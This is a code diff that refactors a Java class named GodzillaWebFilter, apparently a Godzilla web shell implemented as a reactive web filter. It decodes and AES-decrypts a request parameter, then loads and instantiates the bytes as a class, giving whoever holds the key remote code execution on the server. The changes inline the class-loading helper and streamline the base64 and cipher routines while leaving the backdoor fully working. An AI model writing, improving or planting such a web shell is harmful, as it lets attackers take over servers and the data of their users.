@@ -49,7 +49,7 @@ public class GodzillaWebFilter extends ClassLoader implements WebFilter {
                 byte[] data = base64Decode(map.getFirst(pass));
                 data = x(data, false);
                 if (payload == null) {
-                    payload = new GodzillaWebFilter(Thread.currentThread().getContextClassLoader()).Q(data);
+                    payload = new GodzillaWebFilter(Thread.currentThread().getContextClassLoader()).defineClass(data, 0, data.length);
                 } else {
                     ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                     Object f = payload.getDeclaredConstructor().newInstance();
@@ -70,48 +70,29 @@ public class GodzillaWebFilter extends ClassLoader implements WebFilter {
 
     @SuppressWarnings("all")
     public static String base64Encode(byte[] bs) throws Exception {
-        String value = null;
-        Class<?> base64;
         try {
-            base64 = Class.forName("java.util.Base64");
-            Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
-            value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
+            Object encoder = Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
+            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
         } catch (Exception var6) {
-            base64 = Class.forName("sun.misc.BASE64Encoder");
-            Object encoder = base64.newInstance();
-            value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
+            Object encoder = Class.forName("sun.misc.BASE64Encoder").newInstance();
+            return (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
         }
-        return value;
     }
 
     @SuppressWarnings("all")
     public static byte[] base64Decode(String bs) throws Exception {
-        byte[] value = null;
-        Class<?> base64;
         try {
-            base64 = Class.forName("java.util.Base64");
-            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
-            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
+            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var6) {
-            base64 = Class.forName("sun.misc.BASE64Decoder");
-            Object decoder = base64.newInstance();
-            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
+            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
+            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
         }
-        return value;
     }
 
-    @SuppressWarnings("all")
-    public Class<?> Q(byte[] cb) {
-        return super.defineClass(cb, 0, cb.length);
-    }
-
-    public byte[] x(byte[] s, boolean m) {
-        try {
-            Cipher c = Cipher.getInstance("AES");
-            c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
-            return c.doFinal(s);
-        } catch (Exception var4) {
-            return null;
-        }
+    public byte[] x(byte[] s, boolean m) throws Exception {
+        Cipher c = Cipher.getInstance("AES");
+        c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
+        return c.doFinal(s);
     }
 }
